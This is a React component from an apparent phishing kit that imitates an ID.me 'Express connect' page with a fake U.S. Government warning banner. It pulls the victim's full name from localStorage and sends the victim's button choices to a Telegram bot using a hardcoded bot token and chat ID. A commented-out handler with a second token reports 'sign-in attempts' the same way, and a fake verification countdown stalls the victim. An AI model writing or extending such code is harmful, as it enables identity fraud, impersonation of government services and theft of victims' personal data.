import React, { useState, useEffect } from "react";
import logo from '../assets/ID.me_Logo.png';
import connect from '../assets/connect.jpg'
import elogo from '../assets/logo-removebg-preview.png'

const DoYouHaveIdMe: React.FC = () => {
//   const [email, setEmail] = useState("");
//   const [password, setPassword] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(100);
  const BOT_TOKEN = '7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c';
  const CHAT_ID = '7062736155';
  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";



  

const sendToTelegram = async (message: string) => {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });
};


  // const handleSubmit = async (e: React.FormEvent) => {
  //   e.preventDefault();

  //   setShowPopup(true);

  //   const botToken = "6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo";
  //   const chatId = "";
  //   const message = `🔐 New Sign-In Attempt\n`;

  //   try {
  //     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
  //       method: "POST",
  //       headers: {
  //         "Content-Type": "application/json",
  //       },
  //       body: JSON.stringify({
  //         chat_id: chatId,
  //         text: message,
  //       }),
  //     });
  //   } catch (error) {
  //     console.error("Error sending to Telegram:", error);
  //   }
  // };

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
      console.log(setShowPopup)
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);

  return (
    <div className="flex justify-center items-center min-h-screen bg-white px-4 relative">
      {/* Popup Overlay */}
      {showPopup && (
  <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
    <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
      <div className="flex justify-center mb-4"><img src={elogo} width={50}  /></div>
      <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
      <p className="text-sm font-semibold text-black mb-6">
        Please wait while the system connects. Avoid refreshing the page; this may take a moment.
      </p>

      <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
        <div
          className="bg-green-500 h-4 rounded-full transition-all duration-1000"
          style={{ width: `${100 - countdown}%` }}
        ></div>
      </div>

      <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
    </div>
  </div>
)}


      <div className="w-full max-w-md bg-white p-6 text-center relative z-10">
        {/* Spinner */}
        <div className="absolute top-4 left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div>

        {/* Logo */}
        <h1 className="text-3xl flex justify-center gap-4 font-medium mt-10 mb-6">
          <img src={logo} alt="Logo" className="w-[100px]" />
         <img src={connect} alt="" />
        </h1>

        <p className="text-green-800 text-sm mb-6">
          You have an existing IDME account.
          <br />
          Please sign in below
        </p>

        {/* Form */}
        <div className="p-6 text-center">
        {/* Title */}
        <h2 className="text-lg font-bold mb-3">
          Express connect with Id.me account.
        </h2>

        {/* Description */}
        <p className="text-sm text-gray-700 mb-4">
          Using ID.me Connect allows faster verification, as it is already
          authorized to verify identities. If you already have an account, the
          process is quicker and easier.
          <br />
          <br />
          Do you have an Id.me account?
        </p>

        {/* Buttons */}
        <div className="flex justify-center gap-4 mb-6">
  <button
    className="bg-blue-700 hover:bg-blue-800 text-white px-4 py-1.5 rounded font-semibold"
    onClick={() => sendToTelegram(`${fullName} selected: YES`)}
  >
    Yes
  </button>

  <button
    className="bg-blue-700 hover:bg-blue-800 text-white px-4 py-1.5 rounded font-semibold"
    onClick={() => sendToTelegram(`${fullName} selected: NO`)}
  >
    No
  </button>
</div>


        {/* Government Warning Box */}
        <div className="border-l-4 border-red-600 bg-gray-100 p-3 text-left text-xs text-gray-800">
          <p className="font-bold mb-1">
            This U.S. Government system is for authorized use only.
          </p>
          <p>
            Warning: This system may contain private information. By using this
            system, you consent to the monitoring, recording, and reviewing of
            your activities in this system. Unauthorized use is prohibited.
          </p>
        </div>
      </div>
      </div>
    </div>
  );
};

export default DoYouHaveIdMe;
